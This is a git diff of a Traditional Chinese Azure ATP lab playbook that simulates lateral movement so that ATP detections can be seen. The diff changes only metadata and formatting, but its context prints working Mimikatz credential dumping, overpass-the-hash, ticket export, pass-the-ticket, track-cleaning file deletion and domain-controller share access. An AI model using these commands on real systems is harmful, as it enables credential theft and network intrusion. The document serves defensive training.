@@ -2,17 +2,17 @@
 title: Azure ATP 安全性警示橫向移動劇本
 description: Azure ATP 劇本描述如何模擬 Azure ATP 所偵測的橫向移動威脅。
 ms.service: azure-advanced-threat-protection
-ms.topic: tutorial
+ms.topic: how-to
 author: shsagir
 ms.author: shsagir
 ms.date: 03/03/2019
 ms.reviewer: itargoet
-ms.openlocfilehash: 998b932dc88ca14bed4fd008ea5d1d6574e385a0
-ms.sourcegitcommit: 63be53de5b84eabdeb8c006438dab45bd35a4ab7
+ms.openlocfilehash: 03eaafcb803a4cb443ad97f488ab83c690dadffa
+ms.sourcegitcommit: 2be59f0bd4c9fd0d3827e9312ba20aa8eb43c6b5
 ms.translationtype: HT
 ms.contentlocale: zh-TW
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "79410684"
+ms.lasthandoff: 08/27/2020
+ms.locfileid: "88955389"
 ---
 # <a name="tutorial-lateral-movement-playbook"></a>教學課程：橫向移動劇本
 
@@ -45,16 +45,16 @@ ms.locfileid: "79410684"
 ### <a name="mimikatz-sekurlsalogonpasswords"></a>Mimikatz sekurlsa::logonpasswords
 
 1. 在 **VictimPC** 上開啟**提高權限的命令提示字元**。 
-2. 瀏覽至您儲存 Mimikatz 的 [工具] 資料夾，然後執行下列命令：
+1. 瀏覽至您儲存 Mimikatz 的 [工具] 資料夾，然後執行下列命令：
 
    ``` cmd
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
    ```
 
-3. 開啟 **c:\\temp\\victimpc.txt** 檢視透過找到並寫入 txt 檔案收集到的認證 Mimikatz。
-   ![Mimikatz 輸出，包括 RonHD 的 NTLM 雜湊](media/playbook-lateral-sekurlsa-logonpasswords-output.png)
+1. 開啟 **c:\\temp\\victimpc.txt** 檢視透過找到並寫入 txt 檔案收集到的認證 Mimikatz。
+    ![Mimikatz 輸出，包括 RonHD 的 NTLM 雜湊](media/playbook-lateral-sekurlsa-logonpasswords-output.png)
 
-4. 我們已使用 mimikatz，成功從記憶體收集 RonHD 的 NTLM 雜湊。 我們很快就會需要 NTLM 雜湊。
+1. 我們已使用 mimikatz，成功從記憶體收集 RonHD 的 NTLM 雜湊。 我們很快就會需要 NTLM 雜湊。
 
    > [!Important]
    > - 此範例中所顯示的雜湊與您在自己的實驗室環境中看到的雜湊應該不同，而且這是正常的。 本練習的目的是協助您了解如何取得雜湊、其值，並在下一個階段中使用它們。 </br> </br>
@@ -87,9 +87,9 @@ ms.locfileid: "79410684"
    > [!Note]
    > 如果您在上一個步驟中用於 RonHD 的雜湊不同，請將上述的 NTLM 雜湊取代為您從 *victimpc.txt* 收集的雜湊。
 
-   ![透過 mimikatz 的 Overpass-the-hash](media/playbook-lateral-opth1.png)
+    ![透過 mimikatz 的 Overpass-the-hash](media/playbook-lateral-opth1.png)
 
-2. 檢查新的命令提示字元是否開啟。 它將會以 RonHD 的身分執行，但不是看起來*還不*明顯。 請不要關閉新的命令提示字元，因為您接下來還會使用到。
+1. 檢查新的命令提示字元是否開啟。 它將會以 RonHD 的身分執行，但不是看起來*還不*明顯。 請不要關閉新的命令提示字元，因為您接下來還會使用到。
 
 Azure ATP 不會偵測到在本機資源上傳遞的雜湊。 Azure ATP 會偵測何時**從一個資源使用雜湊存取另一個**資源或服務。
 
@@ -107,29 +107,29 @@ Azure ATP 不會偵測到在本機資源上傳遞的雜湊。 Azure ATP 會偵�
    Get-NetLocalGroup 10.0.24.6
    ```
 
-   ![透過 PowerSploit 取得 10.0.24.6 的本機系統管理員](media/playbook-lateral-adminpcsamr.png)
+    ![透過 PowerSploit 取得 10.0.24.6 的本機系統管理員](media/playbook-lateral-adminpcsamr.png)
 
    在幕後，這會使用遠端 SAM，針對我們稍早探索到，已向網域系統管理員帳戶公開的 IP，識別本機系統管理員。
 
    我們的輸出類似如下：
 
-   ![PowerSploit Get-NetLocalGroup 的輸出](media/playbook-lateral-adminpcsamr_results.png)
+    ![PowerSploit Get-NetLocalGroup 的輸出](media/playbook-lateral-adminpcsamr_results.png)
 
    此電腦有兩個本機系統管理員，分別是內建的系統管理員 "ContosoAdmin" 和 "Helpdesk"。 我們知道 RonHD 是 "Helpdesk" 安全性群組的成員。 我們也已經知道電腦的名稱是 AdminPC。 我們擁有 RonHD 的認證，因此我們應該能夠使用該認證橫向移動到 AdminPC 並存取該電腦。
 
-2. 如有需要，從*在 RonHD 的內容中執行的相同命令提示字元*，輸入 **exit** 離開 PowerShell。 然後執行下列命令：
+1. 如有需要，從*在 RonHD 的內容中執行的相同命令提示字元*，輸入 **exit** 離開 PowerShell。 然後執行下列命令：
 
    ``` cmd
    dir \\adminpc\c$
    ```
 
-3. 我們成功存取了 AdminPC。 我們來看看有哪些票證。 在相同的命令提示字元中，執行下列命令：
+1. 我們成功存取了 AdminPC。 我們來看看有哪些票證。 在相同的命令提示字元中，執行下列命令：
 
    ``` cmd
    klist
    ```
 
-   ![使用 klist，向我們顯示目前 cmd.exe 處理程序中的 Kerberos 票證](media/playbook-lateral-klist.png)
+    ![使用 klist，向我們顯示目前 cmd.exe 處理程序中的 Kerberos 票證](media/playbook-lateral-klist.png)
 
 您可以看到，對於這個特定的處理程序，我們在記憶體中有 RonHD 的 TGT。 我們已經在實驗室中順利執行 Overpass-the-Hash 攻擊。 我們轉換了之前遭到入侵的 NTLM 雜湊，並用來取得 Kerberos TGT。 之後該 Kerberos TGT 會用來存取其他網路資源，在此案例中為 AdminPC。 
 
@@ -179,15 +179,15 @@ xcopy mimikatz.exe \\adminpc\c$\temp
 
    該命令將會執行，並匯出 LSASS.exe 處理程序中找到的票證，然後將其放在 AdminPC 上的目前目錄中。
 
-2. 我們需要從 AdminPC，將票證複製回 VictimPC。 我們只對此範例中的 SamiraA 票證感興趣，因此請執行下列命令：
+1. 我們需要從 AdminPC，將票證複製回 VictimPC。 我們只對此範例中的 SamiraA 票證感興趣，因此請執行下列命令：
 
    ``` cmd
    xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
    ```
 
-   ![將收集到的認證從 AdminPC 匯回到 VictimPC](media/playbook-escalation-export_tickets2.png)
+    ![將收集到的認證從 AdminPC 匯回到 VictimPC](media/playbook-escalation-export_tickets2.png)
 
-3. 讓我們在 AdminPC 上刪除檔案以清除我們的追蹤。
+1. 讓我們在 AdminPC 上刪除檔案以清除我們的追蹤。
 
    ``` cmd
    rmdir \\adminpc\c$\temp /s /q
@@ -198,7 +198,7 @@ xcopy mimikatz.exe \\adminpc\c$\temp
 
    在我們 **VictimPC** 上，我們已經在這些收集到的票證放在 **c:\temp\adminpc_tickets** 資料夾中：
 
-   ![C:\temp\tickets 是我們從 AdminPC 匯出的 mimikatz 輸出](media/playbook-escalation-export_tickets4.png)
+    ![C:\temp\tickets 是我們從 AdminPC 匯出的 mimikatz 輸出](media/playbook-escalation-export_tickets4.png)
 
 
 ### <a name="mimikatz-kerberosptt"></a>Mimikatz Kerberos::ptt
@@ -211,28 +211,28 @@ xcopy mimikatz.exe \\adminpc\c$\temp
    mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
    ```
 
-   ![將遭竊的票證匯入到 cmd.exe 處理程序](media/playbook-escalation-ptt1.png)
+    ![將遭竊的票證匯入到 cmd.exe 處理程序](media/playbook-escalation-ptt1.png)
 
-2. 在相同提升權限的命令提示字元中，驗證正確的票證位於命令提示字元工作階段中。 執行下列命令：
+1. 在相同提升權限的命令提示字元中，驗證正確的票證位於命令提示字元工作階段中。 執行下列命令：
 
    ``` cmd
    klist
    ```
 
-   ![執行 klist 以查看在 CMD 處理程序中匯入的票證](media/playbook-escalation-ptt2.png)
+    ![執行 klist 以查看在 CMD 處理程序中匯入的票證](media/playbook-escalation-ptt2.png)
 
-3. 請注意，這些票證保持未使用。 作為攻擊者的我們已成功地「傳遞票證」。 我們從 AdminPC 收集到了 SamirA 的認證，然後將它傳遞至 VictimPC 上執行的另一個處理程序。
+1. 請注意，這些票證保持未使用。 作為攻擊者的我們已成功地「傳遞票證」。 我們從 AdminPC 收集到了 SamirA 的認證，然後將它傳遞至 VictimPC 上執行的另一個處理程序。
 
    > [!Note]
    > 如同在傳遞雜湊中，Azure ATP 不知道已經根據本機用戶端活動傳遞票證。 不過，*一旦使用此票證之後* (也就是用來存取另一個資源/服務的票證)，Azure ATP 就會偵測到活動。
 
-4. 從 **VictimPC** 存取網域控制站，以完成您模擬的攻擊。 在現在使用記憶體中 SamirA 票證執行的命令提示字元中，執行：
+1. 從 **VictimPC** 存取網域控制站，以完成您模擬的攻擊。 在現在使用記憶體中 SamirA 票證執行的命令提示字元中，執行：
 
    ``` cmd
    dir \\ContosoDC\c$
    ```
 
-   ![使用 SamirA 的認證存取 ContosoDC 的 c:\ 磁碟機](media/playbook-escalation-ptt3.png)
+    ![使用 SamirA 的認證存取 ContosoDC 的 c:\ 磁碟機](media/playbook-escalation-ptt3.png)
 
 成功！ 透過我們的模擬攻擊，我們在網域控制站上取得了系統管理員存取權，並成功地入侵我們實驗室的 Active Directory 網域/樹系。
 
